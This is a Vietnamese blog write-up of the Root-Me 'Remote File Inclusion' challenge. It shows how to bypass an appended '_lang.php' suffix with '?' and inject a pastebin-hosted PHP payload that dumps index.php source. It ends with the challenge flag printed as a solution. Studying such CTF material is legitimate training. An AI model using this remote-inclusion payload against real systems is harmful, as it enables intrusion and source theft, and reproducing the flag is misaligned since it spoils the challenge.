---
template: overrides/blog.html
icon: material/plus-circle
title: Remote File Inclusion
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
    - PHP
    - Path Traversal
---

# __Remote File Inclusion__

<span>
:octicons-calendar-24: May 12, 2023

</span>

---


## __Tài nguyên và link challenge__

Tài nguyên của challenge này tại [https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion](https://www.root-me.org/en/Challenges/Web-Server/Remote-File-Inclusion)

Link challenge này tại [:octicons-arrow-right-24: challenge01.root-me.org/web-serveur/ch13/][challenge01.root-me.org/web-serveur/ch13/]

  [challenge01.root-me.org/web-serveur/ch13/]: challenge01.root-me.org/web-serveur/ch13/

## __Tổng quan__

Trong challenge này, mục tiêu của ta là lấy được source code php.

## __Kịch bản tấn công__

Sau một hồi fuzzing website ta biết được khi nó query tại `lang = ...` thì nó tự động thêm `_lang.php` vào sau, ta sẽ phải tìm cách bypass nó. Với lại vì đây là challenge RFI nên ta cũng cần phải tìm 1 website khác để remote từ xa. Đó là ý tưởng :3. Sau một hồi google thì ta phải filter bằng dấu `?` để có thể ngắt việc thêm `_lang.php` vào sau

<figure markdown>
  ![Image title](/rootme/web-server/php/images/remote_file_inclusion-01.png#zoom)
  <figcaption>Hình ảnh nội dung file php</figcaption>
</figure>

Roài, ta sẽ tìm cách lấy sourcecode web bằng việc tiêm `https://pastebin.com/raw/wq4ca9ak` vào với nội dung file text là 

<div class="result" markdown>

``` php linenums="1"
<?php
echo show_source("index.php");
?>
```

</div>

<figure markdown>
  ![Image title](/rootme/web-server/php/images/remote_file_inclusion-02.png#zoom)
  <figcaption>Hình ảnh nội dung file php</figcaption>
</figure>

Ta nhận được flag

!!! success "__Flag__"
    R3m0t3_iS_r3aL1y_3v1l